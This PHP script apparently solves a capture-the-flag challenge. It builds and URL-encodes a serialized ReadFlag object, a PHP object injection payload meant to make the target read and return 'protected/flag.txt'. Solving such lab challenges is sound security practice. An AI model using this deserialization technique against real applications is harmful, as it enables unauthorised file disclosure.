<?php

class ReadFlag {
    private $file;

    function __construct($file) {
        $this->file = $file;
    }

    /* It's not like you could call this. Muhahahaha. */
    function greet() {
        if ($this->file === 'protected/flag.txt') {
            $handle = fopen($this->file, 'r');
            if ($handle) {
                $line = fgets($handle);
                fclose($handle);
                return 'Flag: ' . $line;
            }
        }

        return 'You are a failure.'; // Because you are for not being able to get the flag.
    }
}

print urlencode(serialize(new ReadFlag("protected/flag.txt")));
?>
